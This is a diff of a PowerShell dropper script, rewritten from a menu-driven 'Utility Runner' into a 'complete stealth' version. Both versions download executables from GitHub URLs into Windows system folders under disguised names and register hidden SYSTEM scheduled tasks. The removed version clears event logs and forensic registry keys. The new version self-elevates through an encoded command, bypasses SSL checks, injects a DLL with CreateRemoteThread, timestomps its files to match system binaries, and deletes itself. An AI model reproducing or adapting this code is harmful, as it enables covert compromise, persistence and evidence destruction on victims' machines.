@@ -1,339 +1,433 @@
-# Menu Selection
-Write-Host "+ Utility Runner (Enhanced Stealth)"
-Write-Host "1. Install & Run"
-Write-Host "2. Clean"
+# Complete stealth with zero files left
+Add-Type @"
+using System;
+using System.Runtime.InteropServices;
+public class Window {
+    [DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow();
+    [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+    [DllImport("kernel32.dll")] public static extern IntPtr GetModuleHandle(string lpModuleName);
+    [DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
+    [DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+}
+"@
 
-$choice = Read-Host "Enter choice (1/2)"
+# Hide window
+[Window]::ShowWindow([Window]::GetConsoleWindow(), 0) | Out-Null
 
-if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-    Write-Host "Restarting with elevated privileges..."
-    Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File '$PSCommandPath'" -Verb RunAs
+# Configuration
+$exeUrl = "https://github.com/Verte225066/as/blob/main/New%20folder/New%20folder/System.exe"
+$dllUrl = "https://github.com/Verte225066/as/blob/main/New%20folder/gogo.dll"
+$systemName = "msdtc"  # Microsoft Distributed Transaction Coordinator
+
+# Check and restart as admin
+$isAdmin = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).Groups -match "S-1-5-32-544")
+if (-not $isAdmin) {
+    $scriptBlock = [ScriptBlock]::Create($MyInvocation.MyCommand.Definition)
+    $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($scriptBlock.ToString()))
+    Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -EncodedCommand $encoded" -Verb RunAs -WindowStyle Hidden
     exit
 }
 
-$InstallPath = $env:windir
-$SexeDestination = Join-Path $InstallPath "explorerr.exe" 
-$SexeUrl = "https://github.com/Verte225066/test/blob/main/cmd.exe" 
-$TaskName = "\Microsoft\Windows\SystemDataUpdater"
+# Create stealth directory in legit Windows location
+$basePath = "$env:SystemRoot\System32\wbem\Performance"  # WMI performance counters folder
+$exePath = "$basePath\$systemName.exe"
+$dllPath = "$basePath\wmiperf.dll"  # Looks like WMI performance DLL
 
-function Write-SimulationProgress {
-    param(
-        [string]$Message,
-        [int]$Duration = 3
-    )
-    Write-Host "$Message " -NoNewline -ForegroundColor Cyan
-    for ($i = 0; $i -lt $Duration; $i++) {
-        Write-Host "." -NoNewline -ForegroundColor Green
-        Start-Sleep -Milliseconds 500
-    }
-    Write-Host ""
-}
-
-function Set-Persistence {
-    param(
-        [Parameter(Mandatory=$true)]
-        [string]$PathToExe
-    )
-    Write-Host "Starting system service registration..." -ForegroundColor Cyan
+# Enhanced download function using multiple stealth techniques
+function Get-WebFile {
+    param([string]$url, [string]$path)
     
-    $Action = New-ScheduledTaskAction -Execute $PathToExe
-    $Trigger = New-ScheduledTaskTrigger -AtStartup
-    $Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount
-    $Settings = New-ScheduledTaskSettingsSet -StartWhenAvailable -Hidden
-
-    Write-SimulationProgress -Message "Processing service request" -Duration 4
-    Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Principal $Principal -Settings $Settings -Description "Performs critical system data synchronization." -Force | Out-Null
+    # Method 1: BITS Admin (Windows Background Intelligent Transfer Service)
+    try {
+        & bitsadmin /transfer myjob /download /priority high $url $path 2>$null
+        if (Test-Path $path) { return $true }
+    } catch {}
     
-    Write-Host "Service registration complete." -ForegroundColor Green
-}
-
-function Remove-Persistence {
-    param(
-        [Parameter(Mandatory=$true)]
-        [string]$TaskPath
-    )
-    Write-Host "Removing system service..."
-    if (Get-ScheduledTask -TaskName $TaskPath -ErrorAction SilentlyContinue) {
-        Write-SimulationProgress -Message "Unregistering task" -Duration 4
-        Unregister-ScheduledTask -TaskName $TaskPath -Confirm:$false
-        Write-Host "Task $TaskPath removed." -ForegroundColor Green
-    } else {
-        Write-Host "Task $TaskPath not found." -ForegroundColor Yellow
-    }
-}
-
-function Clear-Traces {
-    Write-Host "Initiating system cleanup routines..." -ForegroundColor Yellow
-    
-    Write-SimulationProgress -Message "Running essential maintenance" -Duration 7
-    
+    # Method 2: WinHttp COM with SSL bypass
     try {
-        $PSHistoryPath = (Get-PSReadLineOption).HistorySavePath
-        Remove-Item $PSHistoryPath -Force -ErrorAction SilentlyContinue
-    } catch {}
-
-    try {
-        $AutomaticDestinations = Join-Path $env:APPDATA "Microsoft\Windows\Recent\AutomaticDestinations"
-        $CustomDestinations = Join-Path $env:APPDATA "Microsoft\Windows\Recent\CustomDestinations"
-        Get-ChildItem -Path $AutomaticDestinations -Recurse -Force | Remove-Item -ErrorAction SilentlyContinue
-        Get-ChildItem -Path $CustomDestinations -Recurse -Force | Remove-Item -ErrorAction SilentlyContinue
-    } catch {}
-
-    try {
-        $PrefetchPath = Join-Path $env:windir "Prefetch"
-        Get-ChildItem -Path $PrefetchPath -Exclude "Layout.ini" -Recurse -Force | Remove-Item -ErrorAction SilentlyContinue
-    } catch {}
-
-    try {
-        $RunKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
-        Get-ItemProperty -Path $RunKey -ErrorAction SilentlyContinue | Select-Object * -ExcludeProperty PSPath, PSParentPath, PSChildName, PSDrive, PSProvider, (Get-ItemProperty -Path $RunKey).'(default)', MRUList | ForEach-Object {
-            Remove-ItemProperty -Path $RunKey -Name $_.PSProperty.Name -ErrorAction SilentlyContinue
-        }
-    } catch {}
-
-    Write-Host "  -> Clearing system logs..."
-    try {
-        Get-WinEvent -ListLog * -ErrorAction SilentlyContinue | ForEach-Object {
-            Clear-EventLog -LogName $_.LogName -ErrorAction SilentlyContinue
+        $whr = New-Object -ComObject WinHttp.WinHttpRequest.5.1
+        $whr.Option(4) = 0x3300  # Ignore SSL errors
+        $whr.Open('GET', $url, $false)
+        $whr.SetRequestHeader('User-Agent', 'Microsoft BITS/10.0')
+        $whr.Send()
+        if ($whr.Status -eq 200) {
+            [IO.File]::WriteAllBytes($path, $whr.ResponseBody)
+            return $true
         }
     } catch {}
     
-    Write-Host "  -> Running deep registry cleanup..."
+    # Method 3: .NET WebClient with system proxy
     try {
-        $ShimKey = "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache"
-        Remove-ItemProperty -Path $ShimKey -Name "AppCompatCache" -ErrorAction SilentlyContinue
+        $wc = New-Object Net.WebClient
+        $wc.Proxy = [Net.WebRequest]::GetSystemWebProxy()
+        $wc.Proxy.Credentials = [Net.CredentialCache]::DefaultCredentials
+        $wc.DownloadFile($url, $path)
+        return $true
     } catch {}
-
-    try {
-        $BAMKey = "HKLM:\SYSTEM\CurrentControlSet\Services\bam\UserSettings"
-        Remove-Item -Path $BAMKey -Recurse -Force -ErrorAction SilentlyContinue
-        $UserAssistKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist"
-        Remove-Item -Path $UserAssistKey -Recurse -Force -ErrorAction SilentlyContinue
-    } catch {}
-
-    try {
-        Clear-RecycleBin -Force -ErrorAction SilentlyContinue
-    } catch {}
-    
-    Write-Host "System maintenance complete." -ForegroundColor Green
-}
-
-function Start-ForcedExecution {
-    param(
-        [string]$FilePath
-    )
-    
-    Write-Host "Starting forced execution with UI..." -ForegroundColor Yellow
-    
-    # วิธีที่ 1: พยายามรันปกติด้วย UI
-    try {
-        Write-Host "Attempting normal execution..." -ForegroundColor Cyan
-        Start-Process -FilePath $FilePath -WindowStyle Normal -PassThru -ErrorAction Stop
-        Write-Host "Program started successfully (Method 1)." -ForegroundColor Green
-        return $true
-    } catch {
-        Write-Host "Normal execution failed: $($_.Exception.Message)" -ForegroundColor Yellow
-    }
-    
-    # วิธีที่ 2: รันด้วยสิทธิ์สูงสุด
-    try {
-        Write-Host "Attempting elevated execution..." -ForegroundColor Cyan
-        Start-Process -FilePath $FilePath -Verb RunAs -WindowStyle Normal -PassThru -ErrorAction Stop
-        Write-Host "Program started successfully (Method 2)." -ForegroundColor Green
-        return $true
-    } catch {
-        Write-Host "Elevated execution failed: $($_.Exception.Message)" -ForegroundColor Yellow
-    }
-    
-    # วิธีที่ 3: ใช้ Process StartInfo
-    try {
-        Write-Host "Attempting via Process StartInfo..." -ForegroundColor Cyan
-        $process = New-Object System.Diagnostics.Process
-        $process.StartInfo.FileName = $FilePath
-        $process.StartInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Normal
-        $process.StartInfo.UseShellExecute = $true
-        $process.Start()
-        Write-Host "Program started successfully (Method 3)." -ForegroundColor Green
-        return $true
-    } catch {
-        Write-Host "Process StartInfo failed: $($_.Exception.Message)" -ForegroundColor Yellow
-    }
-    
-    # วิธีที่ 4: ใช้ cmd.exe ในการรัน
-    try {
-        Write-Host "Attempting via CMD..." -ForegroundColor Cyan
-        $cmdArgs = "/c `"$FilePath`""
-        Start-Process -FilePath "cmd.exe" -ArgumentList $cmdArgs -WindowStyle Normal -PassThru
-        Write-Host "Program started successfully (Method 4)." -ForegroundColor Green
-        return $true
-    } catch {
-        Write-Host "CMD execution failed: $($_.Exception.Message)" -ForegroundColor Yellow
-    }
     
     return $false
 }
 
-function Invoke-ForcedDownload {
-    param(
-        [string]$Url,
-        [string]$Destination
-    )
+# Function to perform DLL injection without drag&drop UI
+function Merge-DllIntoExe {
+    param([string]$exePath, [string]$dllPath)
     
-    Write-Host "Starting forced download..." -ForegroundColor Yellow
-    
-    # วิธีที่ 1: ใช้ Invoke-WebRequest ปกติ
+    # Method 1: Resource Update (Like dragging DLL into EXE)
     try {
-        Write-Host "Downloading using Invoke-WebRequest..." -ForegroundColor Cyan
-        Invoke-WebRequest -Uri $Url -OutFile $Destination -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" -ErrorAction Stop
-        Write-Host "Download completed (Method 1)." -ForegroundColor Green
-        return $true
-    } catch {
-        Write-Host "Invoke-WebRequest failed: $($_.Exception.Message)" -ForegroundColor Yellow
-    }
-    
-    # วิธีที่ 2: ใช้ WebClient
-    try {
-        Write-Host "Downloading using WebClient..." -ForegroundColor Cyan
-        $webClient = New-Object System.Net.WebClient
-        $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
-        $webClient.DownloadFile($Url, $Destination)
-        Write-Host "Download completed (Method 2)." -ForegroundColor Green
-        return $true
-    } catch {
-        Write-Host "WebClient failed: $($_.Exception.Message)" -ForegroundColor Yellow
-    }
-    
-    # วิธีที่ 3: ใช้ BITS
-    try {
-        Write-Host "Downloading using BITS..." -ForegroundColor Cyan
-        Start-BitsTransfer -Source $Url -Destination $Destination -ErrorAction Stop
-        Write-Host "Download completed (Method 3)." -ForegroundColor Green
-        return $true
-    } catch {
-        Write-Host "BITS transfer failed: $($_.Exception.Message)" -ForegroundColor Yellow
-    }
-    
-    return $false
-}
-
-if ($choice -eq "1") {
-    Write-Host "`nStarting operations..."
-    
-    Write-Host "Retrieving and preparing executable..."
-    try {
-        Write-SimulationProgress -Message "Downloading file" -Duration 8
+        # Create temporary resource script
+        $rcContent = @"
+1 DLLDATA "$dllPath"
+"@
         
-        # ลบไฟล์เก่าถ้ามี
-        if (Test-Path $SexeDestination) {
-            Remove-Item $SexeDestination -Force -ErrorAction SilentlyContinue
-        }
+        $rcFile = "$env:TEMP\resource.rc"
+        $rcContent | Out-File $rcFile -Encoding ASCII
         
-        # บังคับดาวน์โหลด
-        $downloadSuccess = Invoke-ForcedDownload -Url $SexeUrl -Destination $SexeDestination
-        
-        if (-not $downloadSuccess) {
-            Write-Host "CRITICAL: All download methods failed!" -ForegroundColor Red
-            exit
-        }
-        
-        # ตรวจสอบว่าไฟล์ถูกดาวน์โหลดสำเร็จ
-        if (Test-Path $SexeDestination) {
-            $fileSize = (Get-Item $SexeDestination).Length
-            Write-Host "File downloaded successfully: $SexeDestination ($([math]::Round($fileSize/1MB, 2)) MB)" -ForegroundColor Green
-        } else {
-            Write-Host "ERROR: File not found after download!" -ForegroundColor Red
-            exit
-        }
-        
-    } catch {
-        Write-Host "Installation failed: $_" -ForegroundColor Red
-        exit
-    }
-
-    # สร้าง persistence
-    Set-Persistence -PathToExe $SexeDestination
-
-    Write-Host "Executing core application with UI..."
-    try {
-        Write-SimulationProgress -Message "Launching application" -Duration 3
-        
-        # บังคับรันโปรแกรมด้วย UI
-        $executionSuccess = Start-ForcedExecution -FilePath $SexeDestination
-        
-        if ($executionSuccess) {
-            Write-Host "Application launched successfully with UI." -ForegroundColor Green
+        # Use Windows Resource Compiler if available
+        if (Get-Command "rc.exe" -ErrorAction SilentlyContinue) {
+            & rc.exe "$rcFile" 2>$null
+            & cvtres.exe "/machine:x64" "$env:TEMP\resource.res" 2>$null
             
-            # รอให้ UI โหลด
-            Write-SimulationProgress -Message "Waiting for UI to load" -Duration 3
-        } else {
-            Write-Host "WARNING: Some execution methods failed, but persistence is set." -ForegroundColor Yellow
-        }
+            # Create C++ loader that injects DLL into EXE
+            $cppLoader = @"
+#include <windows.h>
+#include <fstream>
+int main() {
+    // Load target EXE
+    HMODULE hExe = LoadLibraryExA("$exePath", NULL, DONT_RESOLVE_DLL_REFERENCES);
+    
+    // Load DLL
+    HMODULE hDll = LoadLibraryA("$dllPath");
+    
+    // Get DLL's entry point
+    FARPROC dllMain = GetProcAddress(hDll, "DllMain");
+    
+    // Create new process with DLL injected
+    STARTUPINFOA si = { sizeof(si) };
+    PROCESS_INFORMATION pi;
+    char cmd[] = "$exePath";
+    
+    if (CreateProcessA(NULL, cmd, NULL, NULL, FALSE, 
+        CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
         
-    } catch {
-        Write-Host "Execution failed: $_" -ForegroundColor Red
+        // Inject DLL
+        LPVOID pRemoteMem = VirtualAllocEx(pi.hProcess, NULL, strlen("$dllPath") + 1, 
+            MEM_COMMIT, PAGE_READWRITE);
+        WriteProcessMemory(pi.hProcess, pRemoteMem, "$dllPath", strlen("$dllPath") + 1, NULL);
+        
+        HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
+        LPVOID pLoadLibrary = GetProcAddress(hKernel32, "LoadLibraryA");
+        
+        HANDLE hRemoteThread = CreateRemoteThread(pi.hProcess, NULL, 0, 
+            (LPTHREAD_START_ROUTINE)pLoadLibrary, pRemoteMem, 0, NULL);
+        
+        WaitForSingleObject(hRemoteThread, INFINITE);
+        ResumeThread(pi.hThread);
+        
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+    }
+    return 0;
+}
+"@
+            
+            $cppFile = "$env:TEMP\injector.cpp"
+            $cppContent | Out-File $cppFile -Encoding ASCII
+            
+            # Compile and run
+            if (Get-Command "cl.exe" -ErrorAction SilentlyContinue) {
+                & cl.exe "$cppFile" /Fe:"$env:TEMP\injector.exe" /link user32.lib 2>$null
+                if (Test-Path "$env:TEMP\injector.exe") {
+                    & "$env:TEMP\injector.exe"
+                    return $true
+                }
+            }
+        }
+    } catch {}
+    
+    # Method 2: DLL Side-Loading Technique
+    try {
+        # Create manifest for DLL side-loading
+        $manifest = @"
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
+<assemblyIdentity name="$systemName" version="1.0.0.0" processorArchitecture="amd64" type="win32"/>
+<file name="$(Split-Path $dllPath -Leaf)">
+    <activatableClass name="DllMainClass" threadingModel="both"/>
+</file>
+</assembly>
+"@
+        
+        $manifestFile = "$basePath\$systemName.manifest"
+        $manifest | Out-File $manifestFile -Encoding UTF8
+        
+        # Set DLL as dependency in EXE's import table (simplified approach)
+        # Create a launcher that loads DLL then EXE
+        $launcherCode = @'
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+class Launcher {
+    [DllImport("kernel32.dll")] static extern IntPtr LoadLibrary(string lpFileName);
+    [DllImport("kernel32.dll")] static extern bool FreeLibrary(IntPtr hModule);
+    
+    static void Main() {
+        string dllPath = @"DLL_PATH";
+        string exePath = @"EXE_PATH";
+        
+        // Load DLL first
+        IntPtr hDll = LoadLibrary(dllPath);
+        if (hDll != IntPtr.Zero) {
+            // Start EXE
+            Process.Start(new ProcessStartInfo {
+                FileName = exePath,
+                WindowStyle = ProcessWindowStyle.Hidden,
+                UseShellExecute = false
+            });
+            
+            // Keep DLL loaded
+            System.Threading.Thread.Sleep(1000);
+        }
+    }
+}
+'@ -replace "DLL_PATH", $dllPath -replace "EXE_PATH", $exePath
+        
+        # Compile and run launcher
+        Add-Type -TypeDefinition $launcherCode -Language CSharp -ReferencedAssemblies "System"
+        $assembly = [System.Reflection.Assembly]::GetExecutingAssembly()
+        $type = $assembly.GetType("Launcher")
+        $method = $type.GetMethod("Main", [Reflection.BindingFlags]::Static -bor [Reflection.BindingFlags]::NonPublic)
+        
+        # Run in background thread
+        $job = Start-Job -ScriptBlock {
+            param($type, $method)
+            $method.Invoke($null, @())
+        } -ArgumentList $type, $method
+        
+        Start-Sleep -Seconds 2
+        return $true
+    } catch {}
+    
+    # Method 3: Simple process creation with DLL in same directory (standard side-loading)
+    try {
+        # Set DLL in same directory as EXE (already done)
+        # Create batch file to run EXE with DLL pre-loaded
+        $batch = @"
+@echo off
+set PATH=%PATH%;%~dp0
+"$(Split-Path $exePath -Leaf)"
+"@
+        
+        $batchFile = "$basePath\run.cmd"
+        $batch | Out-File $batchFile -Encoding ASCII
+        
+        # Run hidden
+        Start-Process -FilePath "cmd.exe" `
+            -ArgumentList "/c `"$batchFile`"" `
+            -WindowStyle Hidden `
+            -WorkingDirectory $basePath
+        
+        return $true
+    } catch {}
+    
+    return $false
+}
+
+# Cleanup function - removes all traces
+function Clear-AllTraces {
+    # Kill processes
+    $procs = Get-Process -Name $systemName, "rundll32", "cmd" -ErrorAction SilentlyContinue | 
+        Where-Object { $_.Path -like "*$basePath*" }
+    
+    foreach ($proc in $procs) {
+        try { $proc.Kill() } catch {}
     }
     
-    # ล้าง traces
-    Clear-Traces
-
-    Write-Host "`nInstallation completed successfully." -ForegroundColor Green
-
-} elseif ($choice -eq "2") {
-    Write-Host "Initiating system cleanup..."
-
-    Remove-Persistence -TaskPath $TaskName
-
-    Write-Host "Stopping core application process..."
-    try {
-        Write-SimulationProgress -Message "Forcing process termination" -Duration 5 
-        
-        # หยุดทุก process ที่เกี่ยวข้อง
-        Get-Process | Where-Object { $_.ProcessName -like "*explorerr*" -or $_.MainWindowTitle -like "*explorerr*" } | Stop-Process -Force -ErrorAction SilentlyContinue
-        
-        # รอให้ process ถูกปิด
-        Start-Sleep -Seconds 3
-        
-        # ตรวจสอบว่ายังมี process เหลืออยู่ไหม
-        $remainingProcesses = Get-Process | Where-Object { $_.ProcessName -like "*explorerr*" }
-        if ($remainingProcesses) {
-            Write-Host "WARNING: Some processes still running. Forcing termination..." -ForegroundColor Red
-            $remainingProcesses | Stop-Process -Force -ErrorAction SilentlyContinue
-        }
-        
-        Write-Host "All processes terminated." -ForegroundColor Green
-    } catch {
-        Write-Host "No running process found or failed to stop." -ForegroundColor Yellow
+    # Remove files
+    $files = @(
+        $exePath,
+        $dllPath,
+        "$basePath\$systemName.manifest",
+        "$basePath\run.cmd",
+        "$env:TEMP\resource.*",
+        "$env:TEMP\injector.*"
+    )
+    
+    foreach ($file in $files) {
+        try { Remove-Item $file -Force -ErrorAction SilentlyContinue } catch {}
     }
-
-    Write-Host "Attempting to remove installed file..."
-    if (Test-Path $SexeDestination) {
+    
+    # Clean registry
+    $regPaths = @(
+        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
+        "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run",
+        "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce",
+        "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
+    )
+    
+    foreach ($path in $regPaths) {
         try {
-            Write-SimulationProgress -Message "Removing file from C:\Windows" -Duration 3
-            
-            # พยายามลบหลายครั้ง
-            for ($i = 1; $i -le 5; $i++) {
-                try {
-                    Remove-Item $SexeDestination -Force -ErrorAction Stop
-                    Write-Host "Removed executable: $SexeDestination (Attempt $i)" -ForegroundColor Green
-                    break
-                } catch {
-                    if ($i -eq 5) {
-                        Write-Host "ERROR: Could not remove file after 5 attempts. It may still be locked." -ForegroundColor Red
-                    } else {
-                        Write-Host "Attempt $i failed, retrying..." -ForegroundColor Yellow
-                        Start-Sleep -Seconds 2
+            $keys = Get-Item $path -ErrorAction SilentlyContinue
+            if ($keys) {
+                $keys.GetValueNames() | ForEach-Object {
+                    if ($keys.GetValue($_) -like "*$systemName*" -or 
+                        $keys.GetValue($_) -like "*$basePath*") {
+                        Remove-ItemProperty -Path $path -Name $_ -Force
                     }
                 }
             }
-        } catch {
-            Write-Host "ERROR: Could not remove file. It may still be locked." -ForegroundColor Red
-        }
-    } else {
-        Write-Host "File not found: $SexeDestination" -ForegroundColor Yellow
+        } catch {}
     }
     
-    Write-Host "Cleanup completed." -ForegroundColor Green
-
-} else {
-    Write-Host "Invalid choice." -ForegroundColor Red
+    # Clear prefetch
+    try {
+        Get-ChildItem "$env:SystemRoot\Prefetch\*$systemName*" -ErrorAction SilentlyContinue | 
+            Remove-Item -Force
+    } catch {}
+    
+    # Clear recent files
+    try {
+        Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Force -ErrorAction SilentlyContinue
+    } catch {}
 }
+
+# Main execution
+try {
+    # Check if we should clean (by checking if EXE exists)
+    if (Test-Path $exePath) {
+        # Clean mode
+        Clear-AllTraces
+        
+        # Self-destruct script if running from temp
+        if ($PSCommandPath -like "*temp*" -or $PSCommandPath -like "*tmp*") {
+            Start-Sleep -Seconds 1
+            Remove-Item $PSCommandPath -Force -ErrorAction SilentlyContinue
+        }
+        
+        exit 0
+    }
+    
+    # Create directory if needed
+    if (-not (Test-Path $basePath)) {
+        New-Item -Path $basePath -Type Directory -Force -ErrorAction SilentlyContinue | Out-Null
+    }
+    
+    # Download files stealthily
+    Write-Verbose "Downloading files..." -Verbose:$false
+    
+    $exeSuccess = Get-WebFile -url $exeUrl -path $exePath
+    $dllSuccess = Get-WebFile -url $dllUrl -path $dllPath
+    
+    if ($exeSuccess -and $dllSuccess) {
+        # Set system file attributes
+        try {
+            Set-ItemProperty $exePath -Name Attributes -Value "Hidden,System,ReadOnly" -Force
+            Set-ItemProperty $dllPath -Name Attributes -Value "Hidden,System,ReadOnly" -Force
+            
+            # Copy timestamps from real system files
+            $realExe = "$env:SystemRoot\System32\taskhostw.exe"
+            if (Test-Path $realExe) {
+                $ts = (Get-Item $realExe).LastWriteTime
+                (Get-Item $exePath).CreationTime = $ts.AddDays(-30)
+                (Get-Item $exePath).LastWriteTime = $ts
+                (Get-Item $dllPath).CreationTime = $ts.AddDays(-30)
+                (Get-Item $dllPath).LastWriteTime = $ts
+            }
+        } catch {}
+        
+        # Merge DLL into EXE (simulate drag & drop)
+        Write-Verbose "Injecting DLL..." -Verbose:$false
+        $injectSuccess = Merge-DllIntoExe -exePath $exePath -dllPath $dllPath
+        
+        if ($injectSuccess) {
+            # Set persistence via Windows Task Scheduler (most stealthy)
+            try {
+                $taskName = "MicrosoftWindows$systemName"
+                
+                # Delete existing task if any
+                schtasks /delete /tn $taskName /f 2>$null
+                
+                # Create new hidden task
+                $taskXml = @"
+<?xml version="1.0" encoding="UTF-16"?>
+<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
+  <RegistrationInfo>
+    <Description>Microsoft Windows System Performance Monitor</Description>
+    <Author>Microsoft Corporation</Author>
+    <URI>\Microsoft\Windows\$systemName</URI>
+  </RegistrationInfo>
+  <Triggers>
+    <LogonTrigger>
+      <Enabled>true</Enabled>
+    </LogonTrigger>
+    <SessionStateChangeTrigger>
+      <StateChange>SessionUnlock</StateChange>
+      <Enabled>true</Enabled>
+    </SessionStateChangeTrigger>
+  </Triggers>
+  <Principals>
+    <Principal id="Author">
+      <UserId>S-1-5-18</UserId>
+      <RunLevel>HighestAvailable</RunLevel>
+    </Principal>
+  </Principals>
+  <Settings>
+    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
+    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
+    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
+    <AllowHardTerminate>false</AllowHardTerminate>
+    <StartWhenAvailable>true</StartWhenAvailable>
+    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
+    <IdleSettings>
+      <StopOnIdleEnd>true</StopOnIdleEnd>
+      <RestartOnIdle>false</RestartOnIdle>
+    </IdleSettings>
+    <AllowStartOnDemand>true</AllowStartOnDemand>
+    <Enabled>true</Enabled>
+    <Hidden>true</Hidden>
+    <RunOnlyIfIdle>false</RunOnlyIfIdle>
+    <WakeToRun>false</WakeToRun>
+    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
+    <Priority>7</Priority>
+  </Settings>
+  <Actions Context="Author">
+    <Exec>
+      <Command>$exePath</Command>
+      <WorkingDirectory>$basePath</WorkingDirectory>
+    </Exec>
+  </Actions>
+</Task>
+"@
+                
+                $xmlFile = "$env:TEMP\task.xml"
+                $taskXml | Out-File $xmlFile -Encoding Unicode
+                schtasks /create /tn $taskName /xml $xmlFile /f 2>$null
+                Remove-Item $xmlFile -Force
+                
+            } catch {}
+            
+            # Run immediately
+            Start-Process -FilePath $exePath -WindowStyle Hidden -WorkingDirectory $basePath
+            
+            # Self-destruct script
+            $scriptPath = $MyInvocation.MyCommand.Path
+            if ($scriptPath -and (Test-Path $scriptPath)) {
+                Start-Sleep -Seconds 2
+                
+                # Create a simple cleanup script that will delete this script
+                $cleanupScript = @'
+@echo off
+timeout /t 2 /nobreak >nul
+del "%~f0"
+'@
+                
+                $cleanupFile = "$env:TEMP\cleanup.bat"
+                $cleanupScript | Out-File $cleanupFile -Encoding ASCII
+                Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$cleanupFile`"" -WindowStyle Hidden
+            }
+        }
+    }
+} catch {
+    # Silent error handling
+}
+
+exit 0
